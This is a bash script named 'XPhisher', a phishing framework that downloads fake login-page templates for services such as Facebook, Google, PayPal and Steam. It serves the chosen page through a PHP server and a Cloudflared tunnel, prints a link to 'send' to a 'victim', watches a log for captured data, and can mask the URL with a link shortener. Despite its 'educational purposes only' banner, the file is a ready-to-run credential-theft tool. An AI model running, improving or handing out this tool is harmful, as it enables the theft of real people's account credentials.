#!/bin/bash
# ================================================
#   XPhisher - Advanced Phishing Framework
#   Author : Emmanuel suah
#   For Educational & Authorized Testing Only
# ================================================

clear
cd $HOME

# Colors
r='\033[1;31m'
g='\033[1;32m'
y='\033[1;33m'
b='\033[1;34m'
m='\033[1;35m'
c='\033[1;36m'
e='\033[0m'

# Banner
banner() {
    echo -e "${c}"
    echo "   ██╗  ██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ "
    echo "   ╚██╗██╔╝██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗"
    echo "    ╚███╔╝ ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝"
    echo "    ██╔██╗ ██╔══██╗██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗"
    echo "   ██╔╝ ██╗██║  ██║██║  ██║██║███████║██║  ██║███████╗██║  ██║"
    echo "   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
    echo -e "${m}                    Advanced Edition v2.1${e}"
    echo -e "${r}           [!] EDUCATIONAL PURPOSES ONLY [!]${e}\n"
}

# Dependencies
dependencies() {
    echo -e "${y}[+] Updating & Installing Dependencies...${e}"
    #pkg update -y && pkg upgrade -y
    #pkg install php curl wget git jq -y
    
    if [ ! -f "$PREFIX/bin/cloudflared" ]; then
        echo -e "${y}[+] Installing Cloudflared...${e}"
        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O $PREFIX/bin/cloudflared
        chmod +x $PREFIX/bin/cloudflared
    fi
}

# Setup Sites
setup_sites() {
    if [ ! -d "$HOME/xphisher/sites" ]; then
        echo -e "${y}[+] Downloading Advanced Templates...${e}"
        git clone --quiet https://github.com/htr-tech/zphisher.git $HOME/xphisher/temp
        cp -r $HOME/xphisher/temp/.sites/* $HOME/xphisher/sites/
        rm -rf $HOME/xphisher/temp
        echo -e "${g}[✓] Templates Installed Successfully!${e}"
    fi
}

# Kill Process
kill_process() {
    killall -q php cloudflared ngrok > /dev/null 2>&1
}

# Main Menu
main_menu() {
    banner
    echo -e "${g}Select Target:${e}\n"
    echo -e " ${c}01.${e} Facebook      ${c}02.${e} Instagram     ${c}03.${e} Google"
    echo -e " ${c}04.${e} Microsoft     ${c}05.${e} Apple         ${c}06.${e} Netflix"
    echo -e " ${c}07.${e} PayPal        ${c}08.${e} Twitter(X)    ${c}09.${e} LinkedIn"
    echo -e " ${c}10.${e} Snapchat      ${c}11.${e} TikTok        ${c}12.${e} Discord"
    echo -e " ${c}13.${e} Roblox        ${c}14.${e} Steam         ${c}15.${e} Custom"
    echo -e "\n ${r}00.${e} Exit\n"
    read -p "Choose >> " choice

    case $choice in
        1|01) site="facebook";;
        2|02) site="instagram";;
        3|03) site="google";;
        4|04) site="microsoft";;
        5|05) site="apple";;
        6|06) site="netflix";;
        7|07) site="paypal";;
        8|08) site="twitter";;
        9|09) site="linkedin";;
        10) site="snapchat";;
        11) site="tiktok";;
        12) site="discord";;
        13) site="roblox";;
        14) site="steam";;
        15) echo -e "${y}Custom template path:${e}"; read -p "> " site; site=$(basename $site);;
        0|00) echo -e "${r}Goodbye! Stay ethical.${e}"; exit 0;;
        *) echo -e "${r}Invalid Option!${e}"; sleep 1; main_menu;;
    esac

    tunnel_menu
}

tunnel_menu() {
    echo -e "\n${g}Choose Tunnel:${e}\n"
    echo -e " ${c}1.${e} Cloudflared (Recommended)"
    echo -e " ${c}2.${e} Ngrok"
    echo -e " ${c}3.${e} URL Masking + Cloudflared"
    read -p "Choose >> " tunnel

    case $tunnel in
        1) start_cloudflared;;
        2) start_ngrok;;
        3) start_masked;;
        *) echo -e "${r}Invalid!${e}"; tunnel_menu;;
    esac
}

start_cloudflared() {
    kill_process
    cd $HOME/xphisher/sites/$site || { echo -e "${r}Template not found!${e}"; exit; }
    
    echo -e "${y}[+] Starting PHP Server...${e}"
    php -S localhost:8080 > /dev/null 2>&1 &
    
    echo -e "${y}[+] Starting Cloudflared Tunnel...${e}"
    cloudflared tunnel --url http://localhost:8080 > cf.log 2>&1 &
    sleep 5
    
    link=$(grep -o 'https://[^ ]*trycloudflare.com' cf.log | head -n1)
    echo -e "\n${g}════════════════════════════════════${e}"
    echo -e "${c}Send this link:${e} $link"
    echo -e "${g}════════════════════════════════════${e}\n"
    
    echo -e "${m}[+] Waiting for victim... Press Ctrl+C to stop${e}\n"
    tail -f log.txt 2>/dev/null || echo -e "${y}Waiting for data...${e}"
}

start_masked() {
    start_cloudflared
    echo -e "${y}[+] Masking URL...${e}"
    short=$(curl -s "https://is.gd/create.php?format=json&url=$link" | jq -r '.shorturl')
    echo -e "${g}Masked Link: ${short}${e}"
}

start_ngrok() {
    echo -e "${r}Ngrok requires authentication token in 2025.${e}"
    echo -e "${y}Use Cloudflared instead (Recommended).${e}"
    sleep 2
    tunnel_menu
}

# Main Execution
echo -e "${g}[+] Initializing XPhisher...${e}"
dependencies
setup_sites
main_menu
